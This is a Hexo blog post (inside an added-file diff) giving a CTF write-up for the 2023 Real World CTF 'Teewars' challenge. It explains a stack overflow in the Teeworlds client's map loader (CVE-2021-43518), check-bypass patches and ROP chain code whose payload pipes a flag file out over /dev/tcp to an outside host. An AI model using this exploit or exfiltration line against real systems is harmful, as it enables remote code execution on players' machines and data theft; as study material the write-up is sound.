@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="2023 Real World CTF is an excellent 0&amp;1-day CTF game!  During the game, I solved two challenges: Hardened Redis, tinyvm with my teammates of team r3kapig, and solved Teewars after the game. I deci">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 Real World CTF - Teewars">
+<meta property="og:url" content="http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/index.html">
+<meta property="og:site_name" content="tianstcht 自闭小屋">
+<meta property="og:description" content="2023 Real World CTF is an excellent 0&amp;1-day CTF game!  During the game, I solved two challenges: Hardened Redis, tinyvm with my teammates of team r3kapig, and solved Teewars after the game. I deci">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-01-30T11:45:20.000Z">
+<meta property="article:modified_time" content="2023-01-30T11:51:16.807Z">
+<meta property="article:author" content="tianstcht">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 Real World CTF - Teewars</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/friend/">Friend</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/tianstcht">Github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/07/13/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&text=2023 Real World CTF - Teewars"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&is_video=false&description=2023 Real World CTF - Teewars"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 Real World CTF - Teewars&body=Check out this article: http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&name=2023 Real World CTF - Teewars&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&t=2023 Real World CTF - Teewars"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">2.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vul"><span class="toc-number">3.</span> <span class="toc-text">Vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug"><span class="toc-number">4.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">5.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">6.</span> <span class="toc-text">Ref</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023 Real World CTF - Teewars
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">tianstcht</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-30T11:45:20.000Z" itemprop="datePublished">2023-01-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>2023 Real World CTF is an excellent 0&amp;1-day CTF game! </p>
+<p>During the game, I solved two challenges: Hardened Redis, tinyvm with my teammates of team r3kapig, and solved Teewars after the game.</p>
+<p>I decided to write the writeup about challenge Teewars. Because of covid infection and Chinese new year, until now (2023-1-30), the writeup was just completed. </p>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Generate a malicious map file through CVE-2021-43518 on the game server, and when the game client connects to it, hack the game client.</p>
+<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Teeworlds is an open-source game, its Github description: Teeworlds is a free online multiplayer game, available for all major operating systems.</p>
+<p>The challenge provides a simple rust tool, as a game client, which can connect to any server by entering the ip address. And From the patch of CMakelist and compile parameters, we can know that all canary related protections and PIE are disabled when compiling.</p>
+<p>So our target is to do some malicious operations on the game server, to achieve the purpose of controlling the game client. By observing the compile parameters, we can also guess that the exploit may be a stack bufffer overflow.</p>
+<h2 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h2><p>After some quick search, I found CVE-2021-43518, and got a detailed bug reprot with crash sample from its repo <a target="_blank" rel="noopener" href="https://github.com/teeworlds/teeworlds/issues/2981">issue</a>.</p>
+<p>The vulnerability occurs in the function: <code>CMapLayers::LoadEnvPoints</code> in path <code>src/game/client/components/maplayers.cpp</code>.</p>
+<p>When the client connects to the server, it will load the server’s map file data into the local memory, and invoke <code>CMapLayers::LoadEnvPoints</code> to parse map file data.</p>
+<p>The vulnerability core code is below: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get envelope points</span></span><br><span class="line">CEnvPoint *pPoints = <span class="number">0x0</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> Start, Num;</span><br><span class="line">    pLayers-&gt;Map()-&gt;GetType(MAPITEMTYPE_ENVPOINTS, &amp;Start, &amp;Num);</span><br><span class="line">    pPoints = (CEnvPoint *)pLayers-&gt;Map()-&gt;GetItem(Start, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> env = <span class="number">0</span>; env &lt; Num; env++)</span><br><span class="line">&#123;</span><br><span class="line">    CMapItemEnvelope *pItem = (CMapItemEnvelope *)pLayers-&gt;Map()-&gt;GetItem(Start+env, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pItem-&gt;m_Version &gt;= <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// backwards compatibility</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; pItem-&gt;m_NumPoints; i++)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="comment">// convert CEnvPoint_v1 -&gt; CEnvPoint</span></span><br><span class="line">            CEnvPoint_v1 *pEnvPoint_v1 = &amp;((CEnvPoint_v1 *)pPoints)[i + pItem-&gt;m_StartPoint];</span><br><span class="line">            CEnvPoint p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> c = <span class="number">0</span>; c &lt; pItem-&gt;m_Channels; c++)</span><br><span class="line">            &#123;</span><br><span class="line">                p.m_aValues[c] = pEnvPoint_v1-&gt;m_aValues[c];</span><br><span class="line">                p.m_aInTangentdx[c] = <span class="number">0</span>;</span><br><span class="line">                p.m_aInTangentdy[c] = <span class="number">0</span>;</span><br><span class="line">                p.m_aOutTangentdx[c] = <span class="number">0</span>;</span><br><span class="line">                p.m_aOutTangentdy[c] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            lEnvPoints.add(p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>pItem</code> and <code>pPoints</code> come from map file, and <code>pEnvPoint_v1</code> is a variable of type <code>CEnvPoint_v1</code>, which comes from <code>pPoints</code>, so we have full control over these three variables by modifying the map file. Variable <code>p</code> is a temporary variable of type <code>CEnvPoint</code>.</p>
+<p><code>CEnvPoint</code> and <code>CEnvPoint_v1</code> struct code is below:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CEnvPoint_v1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> m_Time; <span class="comment">// in ms</span></span><br><span class="line">    <span class="type">int</span> m_Curvetype;</span><br><span class="line">    <span class="type">int</span> m_aValues[<span class="number">4</span>]; <span class="comment">// 1-4 depending on envelope (22.10 fixed point)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> operator&lt;(<span class="type">const</span> CEnvPoint_v1 &amp;Other) <span class="type">const</span> &#123; <span class="keyword">return</span> m_Time &lt; Other.m_Time; &#125;</span><br><span class="line">&#125; ;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CEnvPoint</span> :</span> public CEnvPoint_v1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// bezier curve only</span></span><br><span class="line">    <span class="comment">// dx in ms and dy as 22.10 fxp</span></span><br><span class="line">    <span class="type">int</span> m_aInTangentdx[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> m_aInTangentdy[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> m_aOutTangentdx[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> m_aOutTangentdy[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> operator&lt;(<span class="type">const</span> CEnvPoint&amp; other) <span class="type">const</span> &#123; <span class="keyword">return</span> m_Time &lt; other.m_Time; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>Variable <code>p</code> is obviously located on the stack, and <code>p</code>‘s members have fixed size 4. In the loop of assigning <code>p</code>‘s members, the loop is over <code>pItem-&gt;m_Channels</code>, which is int type and still under our map’s control. </p>
+<p>Therefore, a value of <code>pItem-&gt;m_Channels</code> greater than 4, will cause the assignment of <code>p</code>‘s members out of bounds. </p>
+<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>I downloaded crash map <a target="_blank" rel="noopener" href="https://github.com/teeworlds/teeworlds/files/7402713/14.map.zip">file</a> from bug issue above. and debug the client binary based on this map file.</p>
+<p>Basic debug process:</p>
+<ul>
+<li>Modify map file, and replace <code>data/maps/dm1.map</code> with the file.</li>
+<li>Restart the server.</li>
+<li>Set breakpoint at ret address of <code>CMapLayers::LoadEnvPoints</code> stack frame in gdb.</li>
+<li>Start the client with the <code>set args &quot;connect 127.0.0.1&quot; &quot;gfx_fullscreen 0&quot; &quot;gfx_screen_height 240&quot; &quot;gfx_screen_width 360&quot;</code> parameter in gdb.</li>
+</ul>
+<p>I did not analyze the file format of map in detail, so this step has two targets:</p>
+<ul>
+<li>To find the position of <code>pItem-&gt;m_Channels</code> in the map.</li>
+<li>To find the position of <code>pEnvPoint_v1-&gt;m_aValues[c]</code> in the map.</li>
+</ul>
+<p>If I can find these two positions, then I can directly put the payload in the corresponding position.</p>
+<p>By observing the key value in gdb, find the corresponding little endian data in the map file. Change the corresponding data to something special data like <code>0xaabbccdd</code>, and then judge whether the position of value is correct in gdb; until the ROP chain payload can be loaded.</p>
+<p>During debugging, I found some problems: there exists a simple check of map file CRC in function <code>CClient::ProcessServerPacket</code> in file <code>src/engine/client/client.cpp</code>. </p>
+<p>You can do some basic reverse work to generate a fake CRC value to bypass the check. I have no enough time, so I just made a patch directly: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pError = &quot;invalid standard map&quot;;</span></span><br><span class="line">pError = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>And another patch at the server side in function <code>CServer::LoadMap</code> in file <code>src/engine/server/server.cpp</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!m_MapChecker.ReadAndValidateMap(Storage(), aBuf, IStorage::TYPE_ALL))</span><br><span class="line">&#123;</span><br><span class="line">    Console()-&gt;Print(IConsole::OUTPUT_LEVEL_STANDARD, <span class="string">&quot;mapchecker&quot;</span>, <span class="string">&quot;invalid standard map&quot;</span>);</span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>If you wanna understand the file format of the map more, you can read this <a target="_blank" rel="noopener" href="https://ctf0.de/posts/realworldctf5-teewars/">writeup</a> by <a target="_blank" rel="noopener" href="https://ctftime.org/team/54748">Sauercloud</a>.</p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>Last step: write the exploit code.</p>
+<p>It is about ROP with no canary and no PIE, and it is a one-time ROP. I need to execute the following code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;bash -c &#x27;cat /home/rwctf/flag &gt; /dev/tcp/&#123;ip&#125;/&#123;port&#125;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;&#x27;cat /home/rwctf/flag &gt; /dev/tcp/&#123;ip&#125;/&#123;port&#125;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Firstly I found some basic gadgets:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rdi, ret;</span><br><span class="line">pop rsi, ret;</span><br><span class="line">pop rdx, ret;</span><br><span class="line">pop rax, ret;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure>
+
+<p>Therefore, I can easily control the first three parameters of the syscall, and invoke the syscall one time with no return.</p>
+<p>And then I found an interesting gadget:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [rdi], rax; ret;</span><br></pre></td></tr></table></figure>
+
+<p>I can use this gadget to load the required string in the BSS section, the code is as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bin_sh_str = <span class="string">&quot;bash -c &#x27;cat /home/rwctf/flag &gt; /dev/tcp/&#123;ip&#125;/&#123;port&#125;&#x27;&quot;</span></span><br><span class="line">bin_sh_str += <span class="string">&quot;\x00&quot;</span> * (<span class="number">8</span> - (<span class="built_in">len</span>(bin_sh_str) % <span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_sh_str) / <span class="number">8</span>):</span><br><span class="line">    rop += p64(pop_rax_ret)</span><br><span class="line">    rop += bin_sh_str[<span class="number">8</span>*i : <span class="number">8</span>*(i+<span class="number">1</span>)]</span><br><span class="line">    rop += p64(pop_rdi_ret)</span><br><span class="line">    rop += p64(bss_addr + <span class="number">8</span>*i)</span><br><span class="line">    rop += p64(mov_qword_ptr_rdi_rax_ret)</span><br></pre></td></tr></table></figure>
+
+<p>Then I can write the ROP payload about the execve method: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(bss_addr + offset1)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(bss_addr + offset2)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(bss_addr + offset3)</span><br><span class="line">rop += p64(pop_rax_ret)</span><br><span class="line">rop += p64(<span class="number">59</span>) <span class="comment"># execve syscall id</span></span><br><span class="line">rop += p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<p>If you wanna write the ROP payload about the system method, you need to find other interesting gadgets (inspired by <a target="_blank" rel="noopener" href="https://bestwing.me/">God Swing</a>):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rax, rdi; ret;</span><br><span class="line">mov rax, qword ptr [rdi]; ret;</span><br></pre></td></tr></table></figure>
+
+<p>Then I can change the GOT address from <code>__libc_start_main</code> to <code>system</code>, and invoke <code>system</code> function:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mov rdi, read@got;</span></span><br><span class="line"><span class="comment"># mov rax qword ptr [rdi];</span></span><br><span class="line"><span class="comment"># mov rdi, system_read_offset;</span></span><br><span class="line"><span class="comment"># add rax, rdi;</span></span><br><span class="line"><span class="comment"># mov rdi, __libc_start_main@got;</span></span><br><span class="line"><span class="comment"># mov qword ptr [rdi], rax; ret;</span></span><br><span class="line"><span class="comment"># mov rdi, bin_sh_addr;</span></span><br><span class="line"><span class="comment"># call __libc_start_main@plt;</span></span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(read_got)</span><br><span class="line">rop += p64(mov_rax_qword_ptr_rdi_ret)</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(system_read_offset)</span><br><span class="line">rop += p64(add_rax_rdi_ret)</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(libc_start_main_got)</span><br><span class="line">rop += p64(mov_qword_ptr_rdi_rax_ret)</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(bss_addr)</span><br><span class="line">rop += p64(libc_start_main_plt)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>[1]. Teeworlds Github Issue. <a target="_blank" rel="noopener" href="https://github.com/teeworlds/teeworlds/issues/2981">https://github.com/teeworlds/teeworlds/issues/2981</a><br>[2]. Sauercloud Writeup. <a target="_blank" rel="noopener" href="https://ctf0.de/posts/realworldctf5-teewars/">https://ctf0.de/posts/realworldctf5-teewars/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friend/">Friend</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tianstcht">Github</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">2.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vul"><span class="toc-number">3.</span> <span class="toc-text">Vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug"><span class="toc-number">4.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">5.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">6.</span> <span class="toc-text">Ref</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&text=2023 Real World CTF - Teewars"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&is_video=false&description=2023 Real World CTF - Teewars"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 Real World CTF - Teewars&body=Check out this article: http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&title=2023 Real World CTF - Teewars"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&name=2023 Real World CTF - Teewars&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://tianstcht.github.io/2023/01/30/2023%20Real%20World%20CTF%20-%20Teewars/&t=2023 Real World CTF - Teewars"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
